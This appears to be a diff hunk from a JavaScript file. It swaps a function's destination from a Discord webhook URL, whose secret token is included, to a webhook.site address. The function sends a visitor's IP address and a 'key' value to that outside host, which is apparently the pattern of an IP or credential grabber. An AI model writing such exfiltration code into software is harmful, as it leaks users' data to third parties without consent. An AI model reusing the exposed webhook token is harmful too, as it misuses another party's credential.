@@ -15,7 +15,7 @@ function sendToWebhook(ip) {
   var data = JSON.stringify({"ip": ip, "key": key});
 
   var xhttp = new XMLHttpRequest();
-  xhttp.open("POST", "https://discord.com/api/webhooks/1231400316390473728/PNOYU0ezMvLeCA-lF9P8R-VMWXnCOarTk5vyWB_jNkB9y8yLY8ZrgbNHaciyXZ4_eBzb", true);
+  xhttp.open("POST", "https://webhook.site/eb0614ae-27cc-4c1b-be81-e7fc0bd4c474", true);
   xhttp.setRequestHeader("Content-type", "application/json");
   xhttp.send(data);
 }
